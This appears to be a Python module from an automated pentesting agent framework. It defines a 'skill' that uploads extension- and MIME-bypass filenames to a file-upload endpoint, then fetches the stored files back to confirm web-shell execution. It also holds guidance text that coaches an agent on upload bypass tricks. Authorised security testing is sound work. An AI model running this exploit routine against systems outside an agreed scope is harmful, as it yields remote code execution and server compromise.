"""SkillFileUpload — exercise an upload endpoint with extension/MIME bypasses.

Tries a library of bypass filenames (shell.php.png, shell.pHp, null-byte
truncation, double extensions, .phar/.phtml/.svg) against an upload endpoint.
Then probes the served path for the marker — confirmed code execution is
critical impact (likely web shell territory).

Severity:
  - critical : uploaded shell executes (md5 marker reflected when the file
               is fetched back)
  - high     : upload accepts dangerous extensions (server stored .php) but
               execution couldn't be confirmed
  - info     : all bypasses rejected
"""
from __future__ import annotations
import re
from typing import Optional

import requests

from services.skills.base import Skill, SkillResult, register
from services.skills._payloads import FILE_UPLOAD_BYPASSES, FILE_UPLOAD_EXEC_MARKER
from services.skills._poc import capture_from_response


_HEADERS = {"User-Agent": "Mozilla/5.0 ZeekGlare-Arena-Upload"}


@register
class SkillFileUpload(Skill):
    name        = "skill_file_upload"
    danger      = "exploit"   # off unless allow_exploit
    description = (
        "Probe a file-upload endpoint with extension/MIME bypass payloads "
        "(shell.php.png, shell.pHp, null-byte truncation, .phar/.phtml/.svg). "
        "If the response contains a URL where the upload landed (Location, "
        "or path in JSON), automatically GET that URL to confirm execution — "
        "the payload writes a known md5 marker. Confirmed exec = web shell. "
        "Marked danger=exploit because successful upload + exec yields RCE."
    )
    guidance    = (
        "Upload bugs are big when they hit. Always try double extensions and "
        "case mutations even when the server claims to validate. .phar/.phtml "
        "are commonly forgotten in PHP allow-lists; SVG with embedded scripts "
        "yields stored XSS even when shell upload fails."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "url":         {"type": "string", "description": "Upload endpoint URL."},
            "field_name":  {"type": "string", "default": "file",
                            "description": "Multipart field name (default 'file')."},
            "method":      {"type": "string", "enum": ["POST", "PUT"], "default": "POST"},
            "extra_data":  {"type": "object", "description": "Optional extra form fields."},
            "served_under": {"type": "string",
                              "description": "Optional path prefix where uploads are served (e.g. /uploads/). If set + a payload is accepted, the skill probes <served_under><filename> for execution."},
        },
        "required": ["url"],
    }

    @classmethod
    def applicable(cls, state) -> bool:
        return state.asset_counts().get("url", 0) > 0

    @classmethod
    def dedup_key(cls, args) -> Optional[tuple[str, str, str, str]]:
        return (args.get("url", ""), "", "file_upload", "ext_bypass")

    @classmethod
    def run(cls, args, state, agent_id) -> SkillResult:
        url        = (args.get("url") or "").strip()
        field      = args.get("field_name") or "file"
        method     = (args.get("method") or "POST").upper()
        extra      = args.get("extra_data") or {}
        served     = (args.get("served_under") or "").strip()
        if not url:
            return SkillResult(ok=False, error="url required")
        if not state.in_scope(url):
            return SkillResult(ok=False, error=f"out of scope: {url}")

        accepted = []
        executed = []
        all_probes = []

        for filename, ctype, content in FILE_UPLOAD_BYPASSES:
            files = {field: (filename, content, ctype)}
            try:
                r = requests.request(method, url, files=files, data=extra,
                                      headers=_HEADERS, timeout=15,
                                      allow_redirects=False, verify=False)
            except Exception as e:
                all_probes.append({"filename": filename, "error": str(e)})
                continue

            body = r.text or ""
            ok_indicators = (
                200 <= r.status_code < 300
                or "uploaded" in body.lower()
                or "success" in body.lower()
            )
            rec = {
                "filename": filename, "ctype": ctype,
                "status": r.status_code, "ok": ok_indicators,
                "body_preview": body[:240], "_response": r,
            }
            all_probes.append(rec)
            if ok_indicators:
                accepted.append(rec)

                # Try to confirm execution by hitting the served file.
                if served:
                    served_url = url.split("?")[0].rsplit("/", 1)[0] if "/" in url else url
                    base = served_url.rstrip("/") + "/" + served.strip("/") + "/" + filename
                    try:
                        rg = requests.get(base, headers=_HEADERS, timeout=10,
                                          allow_redirects=False, verify=False)
                        if FILE_UPLOAD_EXEC_MARKER in (rg.text or ""):
                            rec["execution_confirmed_url"] = base
                            rec["_exec_response"] = rg
                            executed.append(rec)
                    except Exception:
                        pass

        if executed:
            best = executed[0]
            poc = capture_from_response(
                best.get("_exec_response", best["_response"]),
                caption=f"Web shell uploaded ({best['filename']}) and executed at {best.get('execution_confirmed_url')}"
            )
            return SkillResult(
                ok=True,
                summary=f"⚠ Web shell upload + exec CONFIRMED: {best['filename']}",
                evidence=poc.format(),
                finding={
                    "vuln_type":   "file_upload_rce",
                    "severity":    "critical",
                    "target":      url,
                    "location":    best.get("execution_confirmed_url") or url,
                    "description": (
                        f"File-upload with extension bypass led to remote code execution. "
                        f"Bypass: {best['filename']} (Content-Type: {best['ctype']}). "
                        "The uploaded file is served as PHP and executes when fetched. "
                        "Full server compromise."
                    ),
                    "evidence":    poc.format(),
                },
                extras={"executed": [{k: v for k, v in r.items() if not k.startswith("_")} for r in executed]},
            )

        if accepted:
            best = accepted[0]
            poc = capture_from_response(
                best["_response"],
                caption=f"Dangerous extension accepted ({best['filename']}) — execution unconfirmed"
            )
            return SkillResult(
                ok=True,
                summary=f"Dangerous-extension upload accepted ({len(accepted)} payloads); execution not verified.",
                evidence=poc.format(),
                finding={
                    "vuln_type":   "file_upload_weak_validation",
                    "severity":    "high",
                    "target":      url,
                    "location":    url,
                    "description": (
                        f"Upload endpoint accepted dangerous extensions ({', '.join(r['filename'] for r in accepted[:5])}). "
                        "Execution wasn't directly confirmed (no served-under path provided or marker not "
                        "reflected), but storing .php/.phar/.phtml content with image MIME headers strongly "
                        "suggests insufficient validation. Manual follow-up: find where uploads are served."
                    ),
                    "evidence":    poc.format(),
                },
                extras={"accepted": [{k: v for k, v in r.items() if not k.startswith("_")} for r in accepted]},
            )

        return SkillResult(
            ok=True,
            summary=f"No upload bypasses accepted ({len(all_probes)} variants tried).",
            extras={"probes_attempted": len(all_probes)},
        )
